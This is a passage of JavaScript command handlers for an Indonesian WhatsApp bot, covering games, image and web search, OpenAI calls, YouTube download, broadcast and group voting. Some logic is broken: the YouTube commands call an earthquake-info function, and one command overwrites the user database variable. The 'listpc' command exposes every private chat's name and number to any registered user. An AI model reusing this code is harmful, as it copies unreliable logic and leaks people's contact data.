            if (room.x !== room.o) await conn.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await conn.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            man = `*TICTACTOE*\n\nSihlakan ${text} untuk mengetik ${command} untuk memulai permainan!\n\nNote: *Jika papan tidak muncul sihlakan player 1 untuk mengetik angka 1-9 untuk memulai permainan!*`
            conn.sendTextWithMentions(m.chat, man, m)
            conn.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
            conn.game = conn.game ? conn.game : {}
            try {
            if (conn.game) {
            delete conn.game
            m.reply(`Berhasil menghapus sesi tictactoe`)
            } else if (!conn.game) {
            m.reply(`Tidak dapat menemukan sesi tictactoe!`)
            } else return m.reply('?')
            } catch (e) {
            m.reply('Error!')
            }
            }
            break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.quoted && !text) return m.reply(`Kirim/reply text dengan caption ${prefix + command}`)
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
case 'slot':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (text.length < 1) return m.reply(`Gunakan format *${prefix + command} [jumlah]*
contoh *${prefix + command} 10*`)
if (db.data.users[m.sender].money < text) return m.reply(`Uang anda tidak cukup untuk slot`)
conn.slots = conn.slots ? conn.slots : {}
    if (m.chat in conn.slots) return m.reply('𝙼𝚊𝚜𝚒𝚑 𝙰𝚍𝚊 𝚈𝚐 𝙱𝚎𝚛𝚖𝚊𝚒𝚗 𝚂𝚕𝚘𝚝 𝙳𝚒𝚜𝚒𝚗𝚒, 𝚃𝚞𝚗𝚐𝚐𝚞 𝚂𝚊𝚖𝚙𝚊𝚒 𝚂𝚎𝚕𝚎𝚜𝚊𝚒!!')
    else conn.slots[m.chat] = true
    try { 
        
        let count = text
        let _spin1 = pickRandom(['1', '2', '3', '4', '5']) 
        let _spin2 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin3 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin4 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin5 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin6 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin7 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin8 = pickRandom(['1', '2', '3', '4', '5'])
        let _spin9 = pickRandom(['1', '2', '3', '4', '5'])
        let spin1 = (_spin1 * 1)
        let spin2 = (_spin2 * 1)
        let spin3 = (_spin3 * 1)
        let spin4 = (_spin4 * 1)
        let spin5 = (_spin5 * 1)
        let spin6 = (_spin6 * 1)
        let spin7 = (_spin7 * 1)
        let spin8 = (_spin8 * 1)
        let spin9 = (_spin9 * 1)
        let spins1 = (spin1 == 1 ? '🦁' : spin1 == 2 ? '🐼' : spin1 == 3 ? '🐷' : spin1 == 4 ? '🐮' : spin1 == 5 ? '🦊' : '')
        let spins2 = (spin2 == 1 ? '🦁' : spin2 == 2 ? '🐼' : spin2 == 3 ? '🐷' : spin2 == 4 ? '🐮' : spin2 == 5 ? '🦊' : '')
        let spins3 = (spin3 == 1 ? '🦁' : spin3 == 2 ? '🐼' : spin3 == 3 ? '🐷' : spin3 == 4 ? '🐮' : spin3 == 5 ? '🦊' : '')
        let spins4 = (spin4 == 1 ? '🦁' : spin4 == 2 ? '🐼' : spin4 == 3 ? '🐷' : spin4 == 4 ? '🐮' : spin4 == 5 ? '🦊' : '')
        let spins5 = (spin5 == 1 ? '🦁' : spin5 == 2 ? '🐼' : spin5 == 3 ? '🐷' : spin5 == 4 ? '🐮' : spin5 == 5 ? '🦊' : '')
        let spins6 = (spin6 == 1 ? '🦁' : spin6 == 2 ? '??' : spin6 == 3 ? '🐷' : spin6 == 4 ? '🐮' : spin6 == 5 ? '🦊' : '')
        let spins7 = (spin7 == 1 ? '🦁' : spin7 == 2 ? '🐼' : spin7 == 3 ? '🐷' : spin7 == 4 ? '🐮' : spin7 == 5 ? '🦊' : '')
        let spins8 = (spin8 == 1 ? '🦁' : spin8 == 2 ? '🐼' : spin8 == 3 ? '🐷' : spin8 == 4 ? '🐮' : spin8 == 5 ? '🦊' : '')
        let spins9 = (spin9 == 1 ? '🦁' : spin9 == 2 ? '🐼' : spin9 == 3 ? '🐷' : spin9 == 4 ? '🐮' : spin9 == 5 ? '🦊' : '' )
        let user = global.db.data.users[m.sender]
        user.money -= count * 1
        for (let i = 0; i < 3; i++) {
            await m.reply(`
            *🎰ᴠɪʀᴛᴜᴀʟ sʟᴏᴛ🎰*
            
${pickRandom(['🦁', '🐼', '🐷', '🐮', '🦊'])}|${pickRandom(['🦁', '🐼', '🐷', '🐮', '🦊'])}|${pickRandom(['🦁', '🐼', '🐷', '🐮', '🦊'])}
${pickRandom(['🦁', '🐼', '🐷', '🐮', '🦊'])}|${pickRandom(['🦁', '🐼', '🐷', '🐮', '🦊'])}|${pickRandom(['🦁', '🐼', '🐷', '🐮', '🦊'])} <<==
${pickRandom(['🦁', '🐼', '🐷', '🐮', '🦊'])}|${pickRandom(['🦁', '🐼', '🐷', '🐮', '🦊'])}|${pickRandom(['🦁', '🐼', '🐷', '🐮', '🦊'])}
            
            `)
        }
        let WinOrLose, Hadiah
        if (spin1 == spin2 && spin2 == spin3 && spin3 == spin4 && spin4 == spin5 && spin5 == spin6 && spin6 == spin7 && spin7 == spin8 && spin8 == spin9) {
            WinOrLose = '𝙹𝚊𝚌𝚔𝚙𝚘𝚝𝚜 𝙱𝚎𝚜𝚊𝚛🥳🥳'
            Hadiah = `+${count * 4}`
            user.money += count * 4
        } else if (spin4 == spin5 && spin5  == spin6) {
           WinOrLose = '𝙹𝚊𝚌𝚔𝚙𝚘𝚝𝚜🥳' 
           Hadiah = `+${count * 2}`
           user.money += count * 2
        } else if ((spin1 == spin2 && spin2 == spin3) || (spin7 == spin8 && spin8 == spin9)) {  
            Hadiah = `-${count * 1}`
            WinOrLose = '𝚂𝚎𝚍𝚒𝚔𝚒𝚝 𝙻𝚊𝚐𝚒!!'
        } else {
             Hadiah = `-${count * 1}`
             WinOrLose = '𝙺𝚊𝚖𝚞 𝚔𝚊𝚕𝚊𝚑'
        } 
        tes = `
       *🎰ᴠɪʀᴛᴜᴀʟ sʟᴏᴛ🎰*
${spins1}|${spins2}|${spins3}
${spins4}|${spins5}|${spins6} <<==
${spins7}|${spins8}|${spins9}
*${WinOrLose}* *${Hadiah}*
`
await m.reply(tes)
    } finally {
        delete conn.slots[m.chat]
    }
break
case 'googleimage':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} ayam`)
m.reply(mess.wait)
anus = await googleImage(q)
resultt = await pickRandom(anus)
conn.sendMessage(m.chat, { image: { url: resultt }, caption: '⭔ Media Url : '+resultt }, { quoted: m })
.catch((err) => {
m.reply(`Maaf, tidak ada hasil untuk ${text}`)
})
break
case 'cosplay':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
anuss = await pinterest(`Cosplay`)
result = await pickRandom(anuss)
conn.sendMessage(m.chat, { image: { url: result }, caption: `COSPLAYER` }, { quoted: m })
break
case 'wallpaper':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} naruto`)
m.reply(mess.wait)
try {
anus = await wallanime(text)
result = await pickRandom(anus)
await conn.sendMessage(m.chat, { image: { url: result }, caption: `▢ Media url: ${result}` }, { quoted: m })
} catch (e) {
reply(`Maaf tidak ada result untuk: ${text}`)
}
break
case 'wikimedia':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} Ayam`)
m.reply(mess.wait)
try {
anus = await wikimedia(text)
result = anus[Math.floor(Math.random() * anus.length)]
conn.sendMessage(m.chat, { image: { url: result.image }, caption: `• Title : ${result.title}\n• Source : ${result.source}\n• Media Url : ${result.image}` }, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
break
case 'revoke':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !m.key.fromMe) return m.reply(mess.admin)                                        
let link = await conn.groupRevokeInvite(m.chat)
m.reply( `*Berhasil mereset link group!*\n https://chat.whatsapp.com/${link}`)
break
case 'ebinary':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
            if (!text) return m.reply(`Example : ${prefix + command} Indonesia`)
            let { eBinary } = require('./lib/binary')
            tekss = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            eb = await eBinary(tekss)
            m.reply(eb)
        break
            case 'dbinary':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
            if (!text) return m.reply(`Example : ${prefix + command} Indonesia`)
            let { dBinary } = require('./lib/binary')
            tekss = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            db = await dBinary(tekss)
            m.reply(db)
        break
case 'listpc': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let tekss = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     tekss += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────\n\n`
                 }
                conn.sendTextWithMentions(m.chat, tekss, m)
             }
             break
                case 'listgc': {
                	dmenut = 'ଓ═┅═━–〈'
                dmenub = '┊↬'
                dmenuf = '┗––––––––––✦'
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                	if (!isCreator) return m.reply(mess.owner)
                 let groups = Object.values(await conn.groupFetchAllParticipating())
	
	let str = Object.keys(groups).map((i, index) => {
        return `*${dmenut}* ${1 + index}
*${dmenub} Name :* ${groups[i].subject}
*${dmenub} Owner :* ${groups[i].owner ? "@" + groups[i].owner.split("@")[0] : "Unknown"}
*${dmenub} Subject Owner :* ${groups[i].subjectOwner ? "@" + groups[i].subjectOwner.split("@")[0] : "Unknown"}
*${dmenub} ID :* ${groups[i].id}
*${dmenub} Restrict :* ${groups[i].restrict}
*${dmenub} Announce :* ${groups[i].announce}
*${dmenub} Ephemeral :* ${new Date(groups[i].ephemeralDuration* 1000).toDateString()}
*${dmenub} Desc ID :* ${groups[i].descId}
*${dmenub} Description :* ${groups[i].desc?.toString().slice(0, 10) + '...' || 'unknown'}
*${dmenub} Admins :* ${groups[i].participants.filter(p => p.admin).map((v, i) => `\n${dmenub} ${i + 1}. @${v.id.split('@')[0]}`).join(' [admin]')}
${isCreator ? `*${dmenub} Participants :* ${groups[i].participants.length}` : ''}
*${dmenub} Created :* ${new Date(groups[i].subjectTime* 1000).toDateString()}
*${dmenub} Creation :* ${new Date(groups[i].creation* 1000).toDateString()}
*${dmenub} Size :* ${groups[i].size}
${dmenuf}`.trim()
    }).join('\n\n')
conn.sendTextWithMentions(m.chat,str, m)
             }
             break
case 'truth':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
trut = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/kata-kata/truth.json')
const ttrth = trut[Math.floor(Math.random() * trut.length)]
m.reply(`*TRUTH*\n${ttrth}`)
break
case 'dare':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
dare = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/kata-kata/dare.json')
const der = dare[Math.floor(Math.random() * dare.length)]
m.reply(`*DARE*\n${der}`)
break
case 'lukis':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
          try {
            if (!text) return m.reply(`Example: ${prefix + command} Naruto di atas sapi`);
            const configuration = new Configuration({
              apiKey: openaikey
            });
            m.reply(mess.wait)
            const openai = new OpenAIApi(configuration);
            const response = await openai.createImage({
              prompt: text,
              n: 1,
              size: "512x512",
            });
            //console.log(response.data.data[0].url)
            conn.sendMessage(m.chat, { image: { url: response.data.data[0].url }, caption: `*Hasil dari create gambar: ${text}*` })
            } catch (error) {
          if (error.response) {
            console.log(error.response.status);
            console.log(error.response.data);
            console.log(`${error.response.status}\n\n${error.response.data}`);
          } else {
            console.log(error);
            m.reply("Maaf, sepertinya ada yang error :"+ error.message);
          }
        }
          break;
case 'tanya':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
          try {
            if (!text) return m.reply(`Example: ${prefix + command} apa itu tits`)
            const configuration = new Configuration({
              apiKey: openaikey
            });
            const openai = new OpenAIApi(configuration);
            const response = await openai.createChatCompletion({
          model: "gpt-3.5-turbo",
          messages: [{role: "user", content: text}],
          });
          m.reply(`*ZERO-BOT AI*\n\n\n${response.data.choices[0].message.content}`);
          } catch (error) {
          if (error.response) {
            console.log(error.response.status);
            console.log(error.response.data);
            console.log(`${error.response.status}\n\n${error.response.data}`);
          } else {
            console.log(error);
            m.reply("Maaf, sepertinya ada yang error :"+ error.message);
          }
        }
          break;
case 'artinama':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} Wandy`)
resultt = await primbon.arti_nama(text)
m.reply(`Hasil pencarian artinama untuk: ${text}\n\n${resultt.message.arti}`)
break
case 'artimimpi':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} jatuh`)
resultt = await primbon.tafsir_mimpi(text)
m.reply(`Hasil pencarian tafsir untuk: ${text}\n\n${resultt.message.arti}`)
break
case 'kalkulator':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`: untuk pembagian\n* untuk perkalian\n- untuk pengurangan\n+ untuk pertambahan\n\nExample : #kalkulator 1+1`)
try {
teks2 = `${text} = ${Math_js.evaluate(text)}`
m.reply(teks2)
} catch (e) {
error(util.format(e), m, m.chat)
}
break
case 'brainly':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
  if (!text) return m.reply(`Example: ${prefix + command} 1+1`)
					brainly(text).then(res => {
					teks = '❉───────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					m.reply(teks)
		            })              
					break
case 'wikipedia':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if(!text) return m.reply(`Example : ${prefix + command} asal usul rumah adat`)
m.reply(mess.wait)
ressss = await wiki(text).catch(e => {
return m.reply('Hasil Tidak Ditemukan') 
}) 
resultt = `Hasil pencarian untuk: ${text}\n\n${ressss[0].wiki}`
m.reply(resultt)
break
case 'infogempa':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
hasilnya = await gempa()
teks2 = `*INFO GEMPA*
*Wilayah* : ${hasilnya.Wilayah}
*Lintang* : ${hasilnya.Lintang}
*Bujur* : ${hasilnya.Bujur}
*Magnitudo* : ${hasilnya.Magnitudo}
*Kedalaman* : ${hasilnya.Kedalaman}
*Map* : ${hasilnya.Map}`
conn.sendMessage(m.chat, { image: { url: hasilnya.Map }, caption: teks2 }, { quoted: m })
break
case 'google':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} Bot WhatsApp`)
m.reply(mess.wait)
resss = await ggs({'query' : `${q}`})
kant = ``
for (let i of resss) {
kant += `\n*▢ Judul* : ${i.title}
*▢ Link* : ${i.link}
*▢ Keterangan* : ${i.snippet}\n\n─────────────────────\n`
}
var akhir = kant.trim()
m.reply(akhir)
break
case 'tourl': 
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
m.reply(mess.wait)
let anu = await UploadFileUgu(media)
conn.sendMessage(m.chat, { image: { url: anu.url },  caption: anu.url }, { quoted: m })
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
break
case 'telegraph': 
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
m.reply(mess.wait)
let anu = await TelegraPh(media)
conn.sendMessage(m.chat, { image: { url: anu },  caption: anu }, { quoted: m })
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
break
case 'smeme': 
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Kirim/reply image dengan caption ${prefix + command} teks1|teks2`)
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
if (!/image/.test(mime)) return m.reply(`Kirim/reply image/sticker dengan caption ${prefix + command} teks1|teks2`)
let [teks1, teks2] = text.split`|`
let dwnld = await conn.downloadAndSaveMediaMessage(quoted)
let fatGans = await TelegraPh(dwnld)
m.reply(mess.wait)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(teks1)}/${encodeURIComponent(teks2)}.png?background=${fatGans}`
let FaTiH = await conn.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
} else {
return m.reply(`Kirim/reply image dengan caption ${prefix + command} teks1|teks2`)
}
break
case 'pinterest': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} ayam`)
try {
m.reply(mess.wait)
                anus = await pinterest(text)
                resultt = anus[Math.floor(Math.random() * anus.length)]
                conn.sendMessage(m.chat, { image: { url: resultt }, caption: '⭔ Media Url : '+resultt }, { quoted: m })
                } catch (e) {
                	error(util.format(e), m, m.chat)
                }
            }
            break
case 'listonline':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), nomorBot]
                    conn.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, mentions: online}, { quoted: m })
             break
case 'tinyurl':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} https://youtube.com`)
if (args[0].includes('www')) return m.reply('Url harus berupa https://url')
m.reply(mess.wait)
anus = await axios.get(`https://tinyurl.com/api-create.php?url=${q}`)
m.reply(`${anus.data}`)
break
case 'ytmp4':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if(!text) return m.reply(`Example: ${prefix + command} https://youtu.be/NhIIHLpRa_U`)
m.reply(mess.wait)
try {
data = await gempa(text)
conn.sendMessage(m.chat, { video: { url: data.result }, mimetype: 'video/mp4', fileName: `${data.title}.mp4`, caption: `⭔ Title: ${data.title}\n⭔Quality: ${data.quality}\n⭔Channel: ${data.channel}\n⭔UploadDate: ${data.uploadDate}\n⭔Views: ${data.views}\n⭔Desc: ${data.desc}` }, { quoted: m })
} catch(e){
error(util.format(e), m, m.chat)
}
break
case 'ytmp3':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if(!text) return m.reply(`Example: ${prefix + command} https://youtu.be/NhIIHLpRa_U`)
m.reply(mess.wait)
try {
data = await gempa(text)
txt = `⭔ Title: ${data.title}
⭔Size: ${data.size}
⭔Channel: ${data.channel}
⭔UploadDate: ${data.uploadDate}
⭔Views: ${data.views}
⭔Desc: ${data.desc}


Note: *File mp3 akan dikirim dalam 1-2 menit!*`
conn.sendMessage(m.chat, { image: { url: data.thumb }, caption: txt }, { quoted: m })
conn.sendMessage(m.chat, { audio: { url: data.result }, mimetype: 'audio/mp4' }, { quoted: m })
} catch(e) {
error(util.format(e), m, m.chat)
}
break
case 'afk': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
conn.sendTextWithMentions(m.chat,`「 *MULAI AFK* 」\n\n📛 *Name* : ${nama}\n👤 *User* : @${m.sender.split("@")[0]}\n⏰ *Waktu* : ${wib()}\n📅 *Tanggal*: ${tanggal()}\n✍️ *Alasan* ${text ? ': ' + text : ''}`, m)
            }
            break	
case 'broadcast': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!isCreator) return m.reply(mess.owner)
                if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} wan-can`)
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
            txt = `「 Broadcast Bot 」\n\n${text}`
            conn.sendMessage(yoi, { text: txt })
		}
		m.reply('Sukses Broadcast')
            }
            break
case 'vote': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
            if (!m.isGroup) return m.reply(mess.group)
            if (m.chat in vote) return m.reply(`_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`)
            if (!text) m.reply(`Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`)
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote
*${prefix}upvote* - untuk upvote
*${prefix}devote* - untuk devote`
conn.sendTextWithMentions(m.chat, teks_vote, m)
	    }
            break
               case 'upvote': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
            if (!m.isGroup) return m.reply(mess.group)
            if (!(m.chat in vote)) return m.reply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return m.reply('Kamu Sudah Vote')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote
*${prefix}upvote* - untuk upvote
*${prefix}devote* - untuk devote`
            conn.sendTextWithMentions(m.chat, teks_vote, m)
	    }
             break
                case 'devote': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
            if (!m.isGroup) return m.reply(mess.group)
            if (!(m.chat in vote)) return m.reply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
